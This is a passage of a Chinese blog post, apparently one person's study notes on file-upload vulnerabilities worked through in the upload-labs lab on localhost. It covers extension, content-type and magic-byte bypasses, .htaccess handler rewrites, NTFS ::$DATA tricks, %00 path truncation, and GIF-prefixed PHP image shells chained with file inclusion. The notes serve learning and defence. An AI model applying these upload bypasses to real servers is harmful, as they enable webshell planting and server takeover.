+</span></span><span class="line"><span class="ln">5</span><span class="cl">                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;上传&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">            <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span></code></pre></div><h3 id="方法2-抓包替换后缀名">方法2 抓包替换后缀名</h3>
+<ol>
+<li>选择 1.jpg 文件上传（文件内容是php代码）</li>
+<li>用抓包工具修改后post内容的文件后缀名（这时候payload 已经通过了js校验）</li>
+</ol>
+<p><img class="img-fluid" alt="Imgur" src="https://i.imgur.com/ofmgpwh.png" loading="lazy"
+  
+   />
+
+</p>
+<hr>
+<h2 id="04-绕过content-type">04-绕过content-type</h2>
+<blockquote>
+<p>适用范围：网站后台代码对上传文件de content-type 进行校验</p>
+</blockquote>
+<p>关键语句（php会对content-type进行验证）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;image/gif&#39;</span><span class="p">))</span>
+</span></span></code></pre></div><h3 id="使用burp绕过">使用burp绕过</h3>
+<p>Pass-02</p>
+<p>为了方便观察，我们打开upload lab 的 上传存储文件夹 <code>C:\phpstudy_pro\WWW\upload</code></p>
+<p>常见的媒体格式类型如下：
+更多参考 runoob <a href="https://www.runoob.com/http/http-content-type.html" target="_blank" rel="noopener noreferrer">HTTP content-type | 菜鸟教程 (runoob.com)</a>
+</p>
+<pre><code>  - text/html ： HTML格式
+  - text/plain ：纯文本格式
+  - text/xml ： XML格式
+  - image/gif ：gif图片格式
+  - image/jpeg ：jpg图片格式
+  - image/png：png图片格式
+</code></pre>
+<ol>
+<li>上传1.php文件</li>
+<li>开启抓包，修改文件的 content-type 字段为  image/jpeg</li>
+<li>放行包
+<img class="img-fluid" alt="Imgur" src="https://i.imgur.com/w1QMd8h.png" loading="lazy"
+  
+   />
+
+</li>
+</ol>
+<hr>
+<h2 id="05-绕过简单黑名单">05-绕过简单黑名单</h2>
+<blockquote>
+<p>适用范围：黑名单，后缀限制较少</p>
+</blockquote>
+<p>如果出现这种提示：不允许上传.asp,.aspx,.php,.jsp后缀文件，则可以判断是黑名单上传。</p>
+<p>对于iis：
+可以上传 asa \ cer \ cdx 这些</p>
+<p>对于apache:
+可以上传 phtml \ php3 这些</p>
+<p>Pass03</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;.asp&#39;</span><span class="p">,</span><span class="s1">&#39;.aspx&#39;</span><span class="p">,</span><span class="s1">&#39;.php&#39;</span><span class="p">,</span><span class="s1">&#39;.jsp&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="c1">//这里开始下面一大块就是获取后缀名然后tolower
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"></span>        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">deldot</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span><span class="c1">//删除文件名末尾的点
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//转换为小写
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s1">&#39;::$DATA&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$file_ext</span><span class="p">);</span><span class="c1">//去除字符串::$DATA
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//收尾去空
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>            
+</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">                 <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><hr>
+<h2 id="06-htaccess文件重写攻击">06-.htaccess文件重写攻击</h2>
+<blockquote>
+<p>适用范围：黑名单没有限制 .htaccess， Apache专用</p>
+</blockquote>
+<ol>
+<li>上传 1.jpg 文件</li>
+<li>上传 .htaccess 文件</li>
+<li>访问 jpg 上传后的位置，发现已经执行了里面的php代码</li>
+</ol>
+<p>.htaccess 是一个apache的配置文件，可以修改apache服务器处理文件的行为</p>
+<p>比如我们制作一个攻击用 .htaccess 文件内容如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln">1</span><span class="cl"><span class="nt">&lt;FilesMatch</span> <span class="err">&#34;jpg&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">SetHandler application/x-httpd-php
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nt">&lt;/FilesMatch&gt;</span>
+</span></span></code></pre></div><p>这样你访问jpg文件目录的时候，他就会把你上传 的 jpg 当作 php 来执行了。</p>
+<hr>
+<h2 id="07-大小写绕过">07-大小写绕过</h2>
+<blockquote>
+<p>适用范围：黑名单，php早期版本，5.x</p>
+</blockquote>
+<p>有的上传使用黑名单，且未对大小写进行严格判断：</p>
+<p>这时候可尝试上传 <code>xxx .phP</code> , 但是貌似对于新的php版本无效。</p>
+<hr>
+<h2 id="08-空格绕过windows服务器点绕过">08-空格绕过、windows服务器点绕过</h2>
+<blockquote>
+<p>适用范围：黑名单，php5.x，后端未对空格过滤 ，服务器采用windows系统</p>
+</blockquote>
+<h3 id="空格绕过">空格绕过</h3>
+<p>Pass-06
+Pass-07</p>
+<ol>
+<li>上传1.php</li>
+<li>抓包，改写文件名为 <code>1.php&lt;空格&gt; </code></li>
+<li>放行，上传成功</li>
+</ol>
+<blockquote>
+<p>发现一个问题，就是我一开始用了 小皮面板，php版本：7.3.4 ，无法成功。</p>
+<p>但是后面用了按月给的那个环境，php：5.2.17 可复现。</p>
+<p>所以版本比较高的没用。</p>
+</blockquote>
+<h3 id="windows服务器点绕过">windows服务器点绕过</h3>
+<p>如果对方的后端使用的是Windows， Windows系统会在把文件复制到上传文件夹的时候自动删除文件末尾的点 ， 比如你传 <code>1.php.</code> 通过了验证 ,然后Windows把它给挪到上传文件夹后就自动变成 <code>1.php</code></p>
+<ol>
+<li>上传 <code>1.php</code></li>
+<li>抓包，改写文件名为 <code>1.php. </code></li>
+<li>放行，上传成功</li>
+</ol>
+<hr>
+<h2 id="09-ntfs数据流绕过-data">09-NTFS数据流绕过 DATA</h2>
+<blockquote>
+<p>适用范围：windows NTFS ，黑名单，对::$DATA 字符串未做限制</p>
+</blockquote>
+<pre><code>我是win系统，但是硬盘使用了extFAT格式，所以一直不成功。
+然后我重启这个phpstudy环境，把整个WWW文件位置挪到了NTFS格式硬盘的桌面上，
+还是不行，最后发现要在phpStudy设置中-设置新的网站目录
+</code></pre>
+<p><strong>Pass-08</strong></p>
+<p><strong>方法：</strong>
+抓包，文件名+&quot;::$DATA&quot; 上传，可用绕过后缀检测</p>
+<h3 id="数据流知识">数据流知识</h3>
+<blockquote>
+<p>下面是经过我修改得的GPT回复，可用用来浅浅的了解下NTFS数据流。</p>
+</blockquote>
+<p>NTFS数据流是指在NTFS文件系统中，一个文件可以包含多个数据流（Alternate Data Streams，ADS）。每个数据流可以存储额外的数据，与文件的主数据流相互独立，但在一般情况下是不可见的。</p>
+<p>对于普通用户而言，操作NTFS数据流可能需要一些高级的技术和工具。然而，以下是一种简单的方法来操作NTFS数据流：</p>
+<ol>
+<li>创建一个新的文本文件，例如&quot;test.txt&quot;。</li>
+<li>打开命令提示符（CMD）。</li>
+<li>使用以下命令创建一个新的数据流并写入数据：<br>
+      <code>echo This is a hidden message &gt; test.txt:hidden.txt</code><br>
+   这个命令将在&quot;test.txt&quot;文件中创建一个名为&quot;hidden.txt&quot;的数据流，并将&quot;This is a hidden message&quot;写入该数据流。</li>
+<li>使用以下命令查看文件中的所有数据流：<br>
+      <code>dir /r test.txt</code><br>
+   这个命令将显示&quot;test.txt&quot;文件以及它的所有数据流。</li>
+<li>使用以下命令读取数据流的内容：<br>
+      <code>more &lt; test.txt:hidden.txt</code><br>
+   这个命令将显示&quot;hidden.txt&quot;数据流中的内容。</li>
+</ol>
+<p>请注意，以上方法仅适用于在Windows命令提示符下进行简单的操作。</p>
+<hr>
+<p>我理解，数据流就是NTFS系统中的一种隐藏文件，这玩意可有一个宿主文件。宿主文件删了，数据流就跟着没了。</p>
+<hr>
+<h2 id="10-windows-叠加特征上传">10-windows 叠加特征上传</h2>
+<p>Pass-09</p>
+<blockquote>
+<p>适用范围：windows NTFS ，黑名单，对 尖括号没有限制的情况</p>
+</blockquote>
+<ol>
+<li>上传 <code>s.jpg</code> 文件，文件名用 burp 修改：</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">s.php:s.jpg
+</span></span></code></pre></div><blockquote>
+<p>这时候系统就会通过校验，因为后缀名是jpg，但是因为文件流，实际上 s.jpg 将会不可见。并且会新建一个 s.php 文件（空文件）</p>
+</blockquote>
+<ol start="2">
+<li>
+<p>上传 1.php 文件，抓包修改名称 为 <code>s.&gt;&gt;&gt;</code> 代表 <code>s.???</code> ，会正则匹配到刚才创建的 s.php 。 然后系统会把他的内容变成你新上传的内容。</p>
+</li>
+<li>
+<p>打开 ： http://localhost/upload/s.php 即可发现上传成功</p>
+</li>
+</ol>
+<p>文件名匹配规则：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">  双引号&#34; 等于 点号.
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  大于符号&gt; 等于 问号?
+</span></span><span class="line"><span class="ln">3</span><span class="cl">  小于符号&lt; 等于 星号*
+</span></span></code></pre></div><hr>
+<h2 id="11-双写文件名">11-双写文件名</h2>
+<p>Pass-10</p>
+<blockquote>
+<p>适用范围：黑名单，上传后端使用关键字删除
+如上传 <code>1.php</code> ， 实际会上传文件 <code>1.</code> 到目录的情况</p>
+</blockquote>
+<ol>
+<li>抓包修改文件名称为 <code>1.pphphp</code> （在php外面夹着一个p hp，其他类型文件同理，只要过滤器做的比较垃圾就会成功绕过）</li>
+<li>查看发现上传成功</li>
+</ol>
+<hr>
+<h2 id="12-上传参数目录可控">12-上传参数目录可控</h2>
+<blockquote>
+<p>适用范围：php&lt;5.3.4 ， 未开启gpc , 使用%00</p>
+</blockquote>
+<h3 id="get-方式">Get 方式</h3>
+<p>Pass-11</p>
+<blockquote>
+<p>客户端可以控制上传路径，如 url中有如下类似字串  <code>?save_path=../upload/</code></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">$img_path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;save_path&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
+</span></span></code></pre></div><blockquote>
+<p>正常上传会产生 一个上传目录：<code>../upload/039840198431.jpg</code></p>
+</blockquote>
+<ol>
+<li>上传jpg文件</li>
+<li>抓包修改请求头为 <code>?save_path=../upload/1.php%00</code></li>
+<li>这样上传路径变成 <code>../upload/1.php%00039840198431.jpg</code> ， 然后php 保存的时候把 %00 后面的东西都忽略了，就把文件保存成 1.php 了</li>
+<li>访问 http://localhost/upload/1.php 成功</li>
+</ol>
+<h3 id="post-方式">Post 方式</h3>
+<p>Pass-12</p>
+<p>php后端源码改用了 post 方式获取 savepath，这时候同样可以使用 %00 但是要进行url解码。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"> <span class="nv">$img_path</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_path&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
+</span></span></code></pre></div><ol>
+<li>上传jpg文件</li>
+<li>抓包修改post 内容</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">Content-Disposition: form-data; name=&#34;save_path&#34;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">
+</span></span><span class="line"><span class="ln">3</span><span class="cl">../upload/2.php%00
+</span></span></code></pre></div><ol start="4">
+<li>选择 <code>%00</code> 按下 <code>ctrl + shift + u</code> 进行俩 decode ， 然后放行 (%00 会变成一个空的方框一样的东西)</li>
+<li>访问 http://localhost/upload/1.php 成功</li>
+</ol>
+<hr>
+<h2 id="13-文件头检测绕过">13-文件头检测绕过</h2>
+<p>之前的章节一直是用后缀名限制，并且是黑名单，属于较容易绕过的上传漏洞。
+从这里开始的Pass基本上都是白名单了。</p>
+<p>Pass-13</p>
+<blockquote>
+<p>适用范围：采用文件魔数字（文件头的两个字节）判断文件类型的检测
+上传的图片木马需要借助 <a href="http://localhost/include.php" target="_blank" rel="noopener noreferrer">文件包含漏洞</a>
+ 才能正常运行</p>
+</blockquote>
+<p>常见的文件头参考表（HEX格式） <a href="https://blog.51cto.com/u_2982693/3354695" target="_blank" rel="noopener noreferrer">51CTO博客_</a>
+</p>
+<ul>
+<li>JPEG (jpg)，文件头：FFD8FF</li>
+<li>PNG (png)，文件头：89504E47
+这些都是16进制文件头，可以使用 <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex%28%27Auto%27%29" target="_blank" rel="noopener noreferrer">From Hex - CyberChef</a>
+ 尝试在线解码 ，比如 jpg 解码后是 <code>ÿØÿ</code> 但一般这种乱码都不好用，比较推荐利用gif文件，gif的头<code>47 49 46 38</code>解码后是 <code>GIF8</code>  ，可以轻松使用burp上传。</li>
+</ul>
+<p>获取文件头还有一种简单的方式，就是找到一个文件，用记事本打开，然后复制第一个单词之类的</p>
+<p>制作图片马 有两种方式，一种是基于真正的图片，一种是抓包修改头部，让服务器以为自己收到的是图片。</p>
+<h3 id="基于真正的图片法">基于真正的图片法</h3>
+<p>打开cmd ，准备好 1.gif 和  1.php ，执行下方代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">copy</span> <span class="mf">1.</span><span class="n">gif</span><span class="o">/</span><span class="n">b</span><span class="o">+</span><span class="mf">1.</span><span class="n">php</span> <span class="n">ma</span><span class="p">.</span><span class="n">gif</span>
+</span></span></code></pre></div><p>制作好<code>ma.gif</code>之后，用记事本打开，可以发现，相当于在 原版的 <code>1.gif</code> 尾部，追加了 <code>&lt;?php phpinfo();?&gt;</code> 。</p>
+<ol>
+<li>上传<code>ma.gif</code></li>
+<li>获取上传后路径 http://localhost/upload/1020230731134955.gif ， 路径为 <code>upload/1020230731134955.gif</code></li>
+<li>与文件包含漏洞 http://localhost/include.php 组合</li>
+<li>访问 http://localhost/include.php?file=upload/1020230731134955.gif 图片马执行。</li>
+</ol>
+<h3 id="抓包修改头部法">抓包修改头部法</h3>
+<ol>
+<li>上传 1.php</li>
+<li>抓包修改
+原包</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">-----------------------------30629768524726476051439622056
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Content-Disposition: form-data; name=&#34;upload_file&#34;; filename=&#34;1.php&#34;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Content-Type: application/octet-stream
+</span></span><span class="line"><span class="ln">4</span><span class="cl">
+</span></span><span class="line"><span class="ln">5</span><span class="cl">&lt;?php phpinfo();?&gt;
+</span></span></code></pre></div><p>修改后(修改了文件后缀名和包内容前面部分)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">-----------------------------30629768524726476051439622056
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Content-Disposition: form-data; name=&#34;upload_file&#34;; filename=&#34;1.gif&#34;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Content-Type: application/octet-stream
+</span></span><span class="line"><span class="ln">4</span><span class="cl">
+</span></span><span class="line"><span class="ln">5</span><span class="cl">GIF8&lt;?php phpinfo();?&gt;
+</span></span></code></pre></div><ol start="3">
+<li>截获返回包，搜索<code>../upload</code>  搜索到上传位置 ：/upload/8320230731140148.gif</li>
+<li>与文件包含漏洞 http://localhost/include.php 组合</li>
+<li>访问 http://localhost/include.php?file=upload/8320230731140148.gif 图片马执行。</li>
+</ol>
+<h2 id="14-绕过图片二次渲染">14-绕过图片二次渲染</h2>
+<p>Pass-16</p>
+<blockquote>
+<p>适用范围：图片上传后会进行压缩，压缩后可能会损坏php后门的情况
+上传的图片木马需要借助 <a href="http://localhost/include.php" target="_blank" rel="noopener noreferrer">文件包含漏洞</a>
+ 才能正常运行</p>
+</blockquote>
+<p>解法：先正常上传文件（推荐gif，因为gif压缩比小），然获取压缩后文件，进行对比找到未压缩的部分，用php后门覆盖一小块未压缩部分的文件</p>
+<p>使用工具：HxD Hex Editor<br>
+如果你不想要用这个win工具，可以试试网页版Hex编辑器，但是可能会很卡顿  <a href="https://hexed.it/" target="_blank" rel="noopener noreferrer">https://hexed.it/</a>
+</p>
+<ol>
+<li>上传1.gif，获取上传后文件20161.gif</li>
+<li>通过使用 HxD工具进行查看和对比，发现文件前部基本无区别，覆盖修改一部分内容为</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;?php phpinfo();?&gt;
+</span></span></code></pre></div><ol start="3">
+<li>另存为 3.gif</li>
+<li>上传3.gif ，获取到上传后路径： upload/17173.gif</li>
+<li>与文件包含漏洞 http://localhost/include.php 组合</li>
+<li>访问 http://localhost/include.php?file=upload/17173.gif  图片马执行。</li>
+</ol>
+<h2 id="15-文件名可控绕过">15-文件名可控绕过</h2>
+<p>适用范围：php&lt;5.3.4 ， 未开启gpc , 使用%00</p>
+<p>对于iis&lt;6.0 ： 使用分号 1.asp;1.jpg</p>
+<p>对于apache ，使用 .a 1.php.a (优先左解释)</p>
+<p>斜杠法 ： 1.php/.</p>
+<h2 id="17-文件上传其他漏洞">17-文件上传其他漏洞</h2>
+<p>nginx 0.83</p>
+<p>上传jpg文件，访问 <code>1.jpg%00php</code> ，会被当作php解析</p>
+<p>apahce 1.x 或者 2.x</p>
+<p>当 apache 遇见不认识的后缀名，会从后向前解析例
+如 1.php.rar 不认识 rar 就向前解析，直到知道它认识的后缀名。</p>
+<p>phpcgi 漏洞(nginx iis7 或者以上)</p>
+<p>上传图片1.jpg。访问 1.jpg/1.php 也会解析成 php。</p>
+<p>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</p>
+<p>apache通过 mod_php来运行脚本，其 2.4.0-2.4.29中存在apache 换行解析漏洞，上传文件名为 <code>xxx.php\x0A</code>（x0A) 是换行符
+将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略</p>
+</div><hr /><div class="post-navs d-flex mb-3 justify-content-evenly">
+  <div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-left"></i>
+    <a href="https://cornradio.github.io/hugo/posts/2023-07-27-firefox_burp_proxy/">Firefox 配置 Burp_proxy 和 证书
+</a>
+  </div></div><section class="related-posts-wrapper">
+    <h3>相关文章</h3>
+    <ul class="related-posts"><li><a href="https://cornradio.github.io/hugo/posts/2023-07-27-firefox_burp_proxy/">Firefox 配置 Burp_proxy 和 证书
+</a></li><li><a href="https://cornradio.github.io/hugo/posts/2023-07-14-python-win-%E5%AE%89%E8%A3%85/">Python Win 安装
+</a></li><li><a href="https://cornradio.github.io/hugo/posts/2023-07-13-copyq/">CopyQ
+</a></li><li><a href="https://cornradio.github.io/hugo/posts/2023-03-20epplus-excel/">Csharp 使用 Epplus 读写 Excel表格
+</a></li><li><a href="https://cornradio.github.io/hugo/posts/2023-07-05-%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA2g%E5%A4%A7%E7%9A%84dummy%E6%96%87%E4%BB%B6/">制作一个2G大的dummy文件
+</a></li></ul>
+  </section></div>
+    </article><div class="card component row post-comments">
+  <div class="card-body"><script src="https://utteranc.es/client.js"
+  repo="cornradio/comments"
+  issue-term="pathname"
+  label="comment"
+  theme="preferred-color-scheme"
+  crossorigin="anonymous"
+  async>
+</script></div>
+</div></div>
+</div><aside class="col-lg-4 sidebar d-flex">
+  <div class="container">
+    
+    <section class="card row text-center profile component">
+  <div class="card-body">
+    <div class="col-12 d-flex align-items-center justify-content-center"><img class="profile-avatar rounded-circle" alt="Cartman" src="https://raw.githubusercontent.com/cornradio/imgs/main/sticker2.webp" loading="lazy"
+  
+   />
+</div>
+    <div class="col-12 profile-meta"><div class="profile-name">Cartman</div><div class="profile-bio">Hey guys, this is Cartman here. I know you&#39;re probably thinking, what the hell is Cartman doing writing a blog bio? Well, let me tell you something – I&#39;m not just some fat kid from South Park anymore. I&#39;ve got opinions, ideas, and thoughts that I need to get out there. So, who am I? My name is Eric Theodore Cartman, and I&#39;m a fourth grader at South Park Elementary School. But don&#39;t let my age fool you – I&#39;m wise beyond my years. I mean, have you seen some of the crazy shit I&#39;ve been through? From fighting hippies to battling gingers, I&#39;ve seen it all. But it&#39;s not just about the battles I&#39;ve fought or the enemies I&#39;ve made. It&#39;s about the lessons I&#39;ve learned along the way. Like how sometimes, being an asshole is the only way to get what you want. Or how sometimes, even your closest friends will betray you. Anyway, enough about me. This blog is about you, the reader. I want to hear your thoughts, your ideas, your questions. So, drop me a line and let&#39;s chat. And remember – respect my authoritah!</div><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i>A hotdog</div></div>
+  </div>
+</section>
+  <section class="featured-posts row card component">
+    <div class="card-body">
+      <h2 class="card-title">精选文章</h2>
+      <ul><li><a href="https://cornradio.github.io/hugo/posts/%E8%A7%86%E9%A2%91%E7%BD%91%E7%AB%99%E9%9B%86/">视频网站集
+</a></li><li><a href="https://cornradio.github.io/hugo/posts/vim/">Vim
+</a></li><li><a href="https://cornradio.github.io/hugo/posts/%E5%8F%8B%E9%93%BE/">友情链接
+</a></li></ul>
+    </div>
+  </section><section class="recent-posts row card component">
+  <div class="card-body">
+    <h2 class="card-title">最近文章</h2>
+    <ul><li><a href="https://cornradio.github.io/hugo/posts/2023-07-31-fileupload/">文件上传漏洞笔记
+</a></li><li><a href="https://cornradio.github.io/hugo/posts/2023-07-27-firefox_burp_proxy/">Firefox 配置 Burp_proxy 和 证书
+</a></li><li><a href="https://cornradio.github.io/hugo/posts/2023-07-14-python-win-%E5%AE%89%E8%A3%85/">Python Win 安装
+</a></li><li><a href="https://cornradio.github.io/hugo/posts/2023-07-13-copyq/">CopyQ
+</a></li><li><a href="https://cornradio.github.io/hugo/posts/2023-03-20epplus-excel/">Csharp 使用 Epplus 读写 Excel表格
+</a></li></ul>
+  </div>
+</section><section class="taxonomies row card component">
+      <div class="card-body">
+        <h2 class="card-title">
+          <a href="https://cornradio.github.io/hugo/categories">分类</a>
+        </h2>
+        <div><a href="https://cornradio.github.io/hugo/categories/bash/" class="badge bg-primary text-white rounded post-taxonomy" title="bash">
+            bash
+          </a><a href="https://cornradio.github.io/hugo/categories/centos/" class="badge bg-primary text-white rounded post-taxonomy" title="centos">
+            centos
